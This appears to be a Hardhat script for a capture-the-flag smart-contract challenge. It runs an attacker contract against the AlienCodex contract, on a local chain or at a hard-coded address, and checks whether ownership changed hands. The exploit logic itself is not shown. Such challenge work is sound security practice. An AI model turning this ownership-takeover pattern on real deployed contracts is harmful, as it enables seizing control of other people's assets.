import { ethers, getNamedAccounts, network } from "hardhat";
import { AlienCodex, AlienCodexAttacker } from "../typechain-types";

async function main() {
  let aliexcodex: AlienCodex;
  const { deployer } = await getNamedAccounts();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const alienCodexAttacker: AlienCodexAttacker = await ethers.getContract(
    "AlienCodexAttacker"
  );

  if (isLocalTest) {
    aliexcodex = await ethers.getContract("AlienCodex");
  } else {
    aliexcodex = await ethers.getContractAt(
      "AlienCodex",
      "0xBdE3807e8DC483cc1a0B2742f98FAB714a1dba26"
    );
  }

  async function check() {
    const owner = await aliexcodex.owner();
    console.log(`Owner: ${owner}`);
    console.log(owner == deployer);
  }

  console.log("Before the attack:");

  await check();

  const tx = await alienCodexAttacker.attack();

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After the attack:");

  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
